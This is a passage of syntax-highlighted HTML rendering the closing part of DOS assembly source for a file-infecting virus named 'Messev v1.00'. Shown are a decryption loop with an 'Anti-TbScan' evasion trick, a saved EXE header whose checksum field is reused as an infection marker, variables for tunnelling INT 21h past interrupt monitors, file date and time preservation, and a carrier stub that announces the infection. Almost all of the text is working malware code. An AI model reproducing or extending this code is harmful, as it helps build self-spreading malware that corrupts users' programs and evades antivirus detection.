        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">File_Key</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; Prints a empty string.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NOP_Msg</span><span class="sc0">      </span><span class="sc1">; (Anti-TbScan).</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Decrypt_Byte</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Entry</span><span class="sc0">
</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Header</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Mark</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; .EXE-identifier (always 'MZ').</span><span class="sc0">
</span><span class="sc5">Mod512</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Byte_Pages</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Num_Reloc</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               
</span><span class="sc5">HeaderSize</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MinMem</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MaxMem</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_SS</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_SP</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Checksum</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Checksum, unused by MS-DOS, used by us.</span><span class="sc0">
</span><span class="sc5">Init_IP</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_CS</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


        </span><span class="sc1">; === TEMP VARIABLES ===</span><span class="sc0">

</span><span class="sc5">Status</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_Status</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Int01h</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Int21h</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Tunnelled INT 21h.</span><span class="sc0">
</span><span class="sc5">Int24h</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">New_Pos</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Old_Pos</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Pos</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Read_Bytes</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Padding</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Dos_Segment</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; 1st Memory Control Block.</span><span class="sc0">
</span><span class="sc5">Trace_Mode</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Are we tracing BIOS or DOS-interrupt?</span><span class="sc0">
</span><span class="sc5">Ret_Add</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Tunnel_Int</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Address of the tunneled interrupt.</span><span class="sc0">
</span><span class="sc5">Read_Buffer</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileTime</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileDate</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Temp</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">Carrier</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; Display warning.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Warning_Msg</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">               </span><span class="sc1">; Exit to DOS.</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Warning_Msg</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WARNING: This program is infected with the '</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Messev v1.00 virus!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
